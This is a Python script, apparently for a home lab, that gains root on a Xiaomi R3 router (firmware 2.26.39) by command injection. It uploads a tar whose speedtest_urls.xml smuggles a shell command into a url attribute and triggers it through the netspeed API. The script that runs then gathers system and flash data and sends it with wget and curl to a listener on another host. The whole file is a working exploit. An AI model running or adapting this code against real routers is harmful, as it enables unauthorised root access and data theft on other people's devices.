"""Prova limitata dell'accesso sul solo R3 2.26.39 del laboratorio.

Adatta connect1 di xmir-patcher: nessun binario, password o parametro NVRAM.
Scrive script e inventario in /tmp e riceve il risultato sull'interfaccia Xiaomi.
"""
import io
import argparse
import json
import re
import tarfile
import threading
import time
import hashlib
import os
from pathlib import Path
from http.server import BaseHTTPRequestHandler, HTTPServer

import requests
from stock_session import PRIVATE, login, request, save_private

HOST = '192.168.31.1'
CLIENT = '192.168.31.222'
PORT = 18080


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--script', type=Path, help='Script shell locale già revisionato, eseguito come root')
    parser.add_argument('--wait', type=int, default=10)
    args = parser.parse_args()
    info = json.loads(request('/cgi-bin/luci/api/xqsystem/init_info'))
    if (info.get('hardware'), info.get('romversion'), info.get('inited')) != ('R3', '2.26.39', 1):
        raise SystemExit('Modello, firmware o stato inatteso')
    credentials = json.loads((PRIVATE / 'credentials.json').read_text())
    auth = login(credentials['admin_password'])
    base = f'http://{HOST}/cgi-bin/luci/;stok=' + auth['token'] + '/api/'
    results = []

    class Handler(BaseHTTPRequestHandler):
        def log_message(self, *args):
            pass

        def do_GET(self):
            if self.client_address[0] != HOST:
                self.send_error(403)
                return
            if self.path.startswith('/probe?uid='):
                results.append({'callback': self.path})
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK\n')

        def do_POST(self):
            if self.client_address[0] != HOST:
                self.send_error(403)
                return
            length = int(self.headers.get('Content-Length', 0))
            if not 0 < length <= 8 * 1024 * 1024:
                self.send_error(413)
                return
            if self.path == '/inventory':
                save_private('initial-inventory.txt', self.rfile.read(length).decode(errors='replace'))
                results.append({'inventory_received': True})
            elif re.fullmatch(r'/backup/(ecc|raw|verify)-[0-9]{2}\.bin', self.path):
                folder = PRIVATE.parent / 'backups' / '2026-11-10'
                folder.mkdir(mode=0o700, parents=True, exist_ok=True)
                os.chmod(folder.parent, 0o700)
                target = folder / self.path.rsplit('/', 1)[1]
                if target.exists():
                    self.send_error(409)
                    return
                data = self.rfile.read(length)
                if len(data) != length:
                    self.send_error(400)
                    return
                with os.fdopen(os.open(target, os.O_CREAT | os.O_EXCL | os.O_WRONLY, 0o600), 'wb') as out:
                    out.write(data)
                results.append({'file': target.name, 'bytes': length,
                                'sha256': hashlib.sha256(data).hexdigest(), 'md5': hashlib.md5(data).hexdigest()})
                print('Ricevuto:', target.name, length, 'byte', flush=True)
            else:
                self.send_error(404)
                return
            self.send_response(200)
            self.end_headers()

    shell = f'''#!/bin/sh
umask 077
{{
echo '=== identity ==='; id; uname -a
echo '=== cpu ==='; cat /proc/cpuinfo
echo '=== memory ==='; cat /proc/meminfo
echo '=== mtd ==='; cat /proc/mtd
echo '=== tools ==='; command -v curl; command -v nanddump; command -v dropbear
echo '=== kernel ==='; dmesg
}} > /tmp/xiaomi-lab-inventory.txt 2>&1
wget -q -O /dev/null 'http://{CLIENT}:{PORT}/probe?uid='$(id -u)
if command -v curl >/dev/null 2>&1; then
curl --noproxy '*' -s --connect-timeout 3 --max-time 8 --data-binary @/tmp/xiaomi-lab-inventory.txt http://{CLIENT}:{PORT}/inventory >/dev/null
fi
'''
    if args.script:
        shell = args.script.read_text()
    command = '((sh /tmp/script.sh) &)'
    # Conserva la struttura a righe del formato originale: il parser stock
    # potrebbe essere basato su strumenti shell e non su un parser XML.
    items = '\n'.join(f'        <item url="http://{CLIENT}:{PORT}/noop"/>' for _ in range(14))
    xml = f'''<?xml version="1.0"?>
<root>
    <class type="1">
{items}
    </class>
    <class type="2">
        <item url="http://{HOST} -q -O /dev/null;{command};exit;wget http://{HOST} "/>
    </class>
    <class type="3">
        <item uploadurl="http://{CLIENT}:{PORT}/noop"/>
    </class>
</root>
'''
    archive = io.BytesIO()
    with tarfile.open(fileobj=archive, mode='w:gz') as tar:
        for name, body in [('speedtest_urls.xml', xml), ('script.sh', shell)]:
            save_private(name, body)
            tar.add(PRIVATE / name, arcname=name)
    server = HTTPServer((CLIENT, PORT), Handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    http = requests.Session()
    http.trust_env = False
    try:
        response = http.post(base + 'misystem/c_upload', files={'image': ('probe.tar.gz', archive.getvalue())}, timeout=15)
        try:
            upload = response.json()
        except ValueError:
            upload = {'http_status': response.status_code}
        save_private('access-upload-response.json', json.dumps(upload))
        print('Upload prova: HTTP', response.status_code, 'code=', upload.get('code'))
        # I progetti di riferimento attivano netspeed anche se il ripristino
        # configurazione fallisce: il tar può avere già estratto i file in /tmp.
        if response.status_code != 200 or upload.get('code') not in (0, 1629):
            return
        try:
            response = http.get(base + 'xqnetdetect/netspeed', timeout=15)
            print('Trigger prova: HTTP', response.status_code)
        except requests.RequestException as error:
            print('Trigger senza risposta completa:', type(error).__name__)
        deadline = time.monotonic() + args.wait
        while time.monotonic() < deadline and not any(r.get('inventory_received') for r in results):
            time.sleep(0.2)
        save_private('access-probe-result.json', json.dumps(results, indent=2))
        print('Risultati:', json.dumps(results) if len(results) < 5 else f'{len(results)} eventi; dettagli in private/access-probe-result.json')
    finally:
        server.shutdown()
        server.server_close()


if __name__ == '__main__':
    main()
